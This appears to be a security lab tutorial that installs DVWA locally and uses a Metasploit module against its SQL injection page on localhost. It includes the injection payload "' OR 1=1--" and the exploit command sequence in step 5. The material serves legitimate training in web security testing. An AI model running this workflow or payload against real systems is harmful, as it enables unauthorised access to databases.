# ✅ Lab 05B: SQL Injection using Metasploit (DVWA / TryHackMe)

## 🎯 Objective

Demonstrate SQL Injection (SQLi) exploitation using Metasploit in a vulnerable lab setup like DVWA or TryHackMe.

## 🛠 Tools Used

- DVWA (Damn Vulnerable Web App)
- Metasploit Framework
- MySQL, Apache, PHP

## 🔄 Task Summary

- Set up DVWA locally.
- Use Metasploit to exploit SQLi vulnerability.
- Understand blind SQL injection automation.

## 🧪 Steps

### 🔹 Step 1: Set up DVWA

`bash
sudo apt update
sudo apt install apache2 mysql-server php php-mysqli git -y
git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
sudo chown -R www-data:www-data /var/www/html/dvwa
`

### 🔹 Step 2: Configure the database

`bash
sudo mysql -u root
CREATE DATABASE dvwa;
CREATE USER 'dvwauser'@'localhost' IDENTIFIED BY 'dvwapass';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwauser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
`

### 🔹 Step 3: Update DVWA config

`bash
sudo nano /var/www/html/dvwa/config/config.inc.php

# Update database user and password to match 'dvwauser' and 'dvwapass'

`

### 🔹 Step 4: Start services

`bash
sudo systemctl start apache2 mysql
`

### 🔹 Step 5: Launch Metasploit and exploit SQLi

`bash
msfconsole
search sql_injection
use auxiliary/scanner/http/sqli_blind
set RHOSTS 127.0.0.1
set TARGETURI /dvwa/vulnerabilities/sqli/
set METHOD GET
set PARAMETER id
set PAYLOAD "' OR 1=1--"
run
`

## 👀 Observations

- SQL Injection allows unauthorized access to the database.
- Metasploit automates the injection and verifies vulnerability.
- Highlights importance of sanitizing user input.

## ✅ Expected Output

- Confirmation of SQL Injection vulnerability.
- Response indicating successful data retrieval or blind sqli trigger.
